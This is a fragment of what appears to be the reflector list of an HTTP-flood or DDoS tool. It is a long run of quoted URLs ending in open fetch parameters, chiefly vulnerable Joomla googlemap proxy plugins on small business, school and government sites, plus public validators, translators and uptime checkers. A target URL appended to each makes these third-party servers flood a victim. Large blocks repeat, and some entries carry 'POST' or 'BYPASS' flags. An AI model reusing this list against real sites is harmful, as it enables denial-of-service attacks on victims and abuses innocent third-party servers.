     'http://www.virtualsoft.pl/plugins/content/plugin_googlemap3_proxy.php?url=',
     'http://gminazdzieszowice.pl/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://fets3.freetranslation.com/?Language=English%2FSpanish&Sequence=core&Url=',
     'http://www.fare-furore.com/com-line/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.rotisseriesalaberry.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.lbajoinery.com.au/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.seebybike.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.copiflash.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://suttoncenterstore.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://coastalcenter.net/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://GREENhousesurgery.org/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.vertexi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.owl.cat/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.sizzlebistro.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://thebluepine.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://donellis.ie/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=',
     'http://validator.w3.org/nu/?doc=',
     'http://check-host.net/check-http?host=',
     'http://www.netvibes.com/subscribe.php?url=',
     'http://www-test.cisel.ch/web/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.sistem5.net/ww/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.fmradiom.hu/palosvorosmart/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.iguassusoft.com/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://lab.univ-batna.dz/lea/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.computerpoint3.it/cp3/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://hotel-veles.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://klaassienatuinstra.nl/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.google.com/ig/add?feedurl=',
     'http://anonymouse.org/cgi-bin/anon-www.cgi/',
     'http://www.google.com/translate?u=',
     'http://translate.google.com/translate?u=',
     'http://validator.w3.org/feed/check.cgi?url=',
     'http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=',
     'http://validator.w3.org/check?uri=',
     'http://jigsaw.w3.org/css-validator/validator?uri=',
     'http://validator.w3.org/checklink?uri=',
     'http://qa-dev.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=',
     'http://www.w3.org/RDF/Validator/ARPServlet?URI=',
     'http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=',
     'http://www.w3.org/services/tidy?docAddr=',
     'http://validator.w3.org/mobile/check?docAddr=',
     'http://validator.w3.org/p3p/20020128/p3p.pl?uri=',
     'http://validator.w3.org/p3p/20020128/policy.pl?uri=',
     'http://online.htmlvalidator.com/php/onlinevallite.php?url=',
     'http://feedvalidator.org/check.cgi?url=',
     'http://gmodules.com/ig/creator?url=',
     'http://www.google.com/ig/adde?moduleurl=',
     'http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=',
     'http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=',
     'http://host-tracker.com/check_page/?furl=',
     'http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=',
     'http://www.viewdns.info/ismysitedown/?domain=',
     'http://www.onlinewebcheck.com/check.php?url=',
     'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
     'http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=',
     'http://streamitwebseries.twww.tv/proxy.php?url=',
     'http://www.comicgeekspeak.com/proxy.php?url=',
     'http://feedvalidator.org/check.cgi?url=',
     'http://gmodules.com/ig/creator?url=',
     'http://www.google.com/ig/adde?moduleurl=',
     'http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=',
     'http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=',
     'http://host-tracker.com/check_page/?furl=',
     'http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=',
     'http://www.onlinewebcheck.com/check.php?url=',
     'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
     'http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=',
     'http://about42.nl/www/showheaders.php;POST;about42.nl.txt',
     'http://browsershots.org;POST;browsershots.org.txt',
     'http://streamitwebseries.twww.tv/proxy.php?url=',
     'http://www.comicgeekspeak.com/proxy.php?url=',
     'http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=',
     'http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt',
     'http://web-sniffer.net/?url=',
     'http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=',
     'http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=',
     'http://translate.yandex.net/tr-url/ru-uk.uk/',
     'http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=',
     'http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=',
     'http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS',
     'http://lavori.joomlaskin.it/italyhotels/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=',
     'http://santaclaradelmar.com/hoteles/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=',
     'http://www.authentic-luxe-locations.com/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=',
     'http://www.keenecinemas.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.hotelmonyoli.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://prosperitydrug.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://policlinicamonteabraao.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.vetreriafasanese.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.benawifi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.valleyview.sa.edu.au/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.racersedgekarting.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=?url=',
     'http://www.villamagnoliarelais.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://worldwide-trips.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://systemnet.com.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.netacad.lviv.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.veloclub.ru/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.virtualsoft.pl/plugins/content/plugin_googlemap3_proxy.php?url=',
     'http://gminazdzieszowice.pl/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://fets3.freetranslation.com/?Language=English%2FSpanish&Sequence=core&Url=',
     'http://www.fare-furore.com/com-line/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.rotisseriesalaberry.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.lbajoinery.com.au/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.seebybike.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.copiflash.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://suttoncenterstore.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://coastalcenter.net/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://GREENhousesurgery.org/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.vertexi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.owl.cat/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.sizzlebistro.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://thebluepine.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://donellis.ie/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=',
     'http://validator.w3.org/nu/?doc=',
     'http://check-host.net/check-http?host=',
     'http://www.netvibes.com/subscribe.php?url=',
     'http://www-test.cisel.ch/web/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.sistem5.net/ww/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.fmradiom.hu/palosvorosmart/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.iguassusoft.com/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://lab.univ-batna.dz/lea/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.computerpoint3.it/cp3/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://hotel-veles.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://klaassienatuinstra.nl/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.google.com/ig/add?feedurl=',
     'http://anonymouse.org/cgi-bin/anon-www.cgi/',
     'http://www.google.com/translate?u=',
     'http://translate.google.com/translate?u=',
     'http://validator.w3.org/feed/check.cgi?url=',
     'http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=',
     'http://validator.w3.org/check?uri=',
     'http://jigsaw.w3.org/css-validator/validator?uri=',
     'http://validator.w3.org/checklink?uri=',
     'http://qa-dev.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=',
     'http://www.w3.org/RDF/Validator/ARPServlet?URI=',
     'http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=',
     'http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=',
     'http://www.w3.org/services/tidy?docAddr=',
     'http://validator.w3.org/mobile/check?docAddr=',
     'http://validator.w3.org/p3p/20020128/p3p.pl?uri=',
     'http://validator.w3.org/p3p/20020128/policy.pl?uri=',
     'http://online.htmlvalidator.com/php/onlinevallite.php?url=',
     'http://feedvalidator.org/check.cgi?url=',
     'http://gmodules.com/ig/creator?url=',
     'http://www.google.com/ig/adde?moduleurl=',
     'http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=',
     'http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=',
     'http://host-tracker.com/check_page/?furl=',
     'http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=',
     'http://www.viewdns.info/ismysitedown/?domain=',
     'http://www.onlinewebcheck.com/check.php?url=',
     'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
     'http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=',
     'http://about42.nl/www/showheaders.php;POST;about42.nl.txt',
     'http://browsershots.org;POST;browsershots.org.txt',
     'http://streamitwebseries.twww.tv/proxy.php?url=',
     'http://www.comicgeekspeak.com/proxy.php?url=',
     'http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://ijzerhandeljanssen.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://link2europe.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://peelmc.ca/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://s2p.lt/main/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://smartonecity.com/pt/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://snelderssport.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://sunnyhillsassistedliving.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://thevintagechurch.com/www2/index.php?url=/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.abc-haus.ch/reinigung/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.alhambrahotel.net/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.aliento.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=',
     'http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.fotorima.com/rima/site2/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.icel.be/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.idea-designer.com/idea/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.jana-wagenknecht.de/wcms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.kjg-hemer.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.labonnevie-guesthouse-jersey.com/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.oliebollen.me/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.paro-nl.com/v2/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.precak.sk/penzion/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.pyrenees-cerdagne.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.rethinkingjournalism.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.sealyham.sk/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.siroki.it/newsite/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.uchlhr.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.virmcc.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.visitsliven.com/bg/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.yigilca.gov.tr/_tr/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.dunaexpert.hu/home/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.stephanus-web.de/joomla1015/mambots/content/plugin_googlemap2_proxy.php?url=',
     'http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt',
     'http://web-sniffer.net/?url=',
     'http://www.map-mc.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://diegoborba.com.br/andes/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://karismatic.com.my/new/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.awf.co.nz/plugins/system/plugin_googlemap3_proxy.php?url=',
     'http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=',
     'http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=',
     'http://translate.yandex.net/tr-url/ru-uk.uk/',
     'http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.phimedia.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.epcelektrik.com/en/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=',
     'http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=',
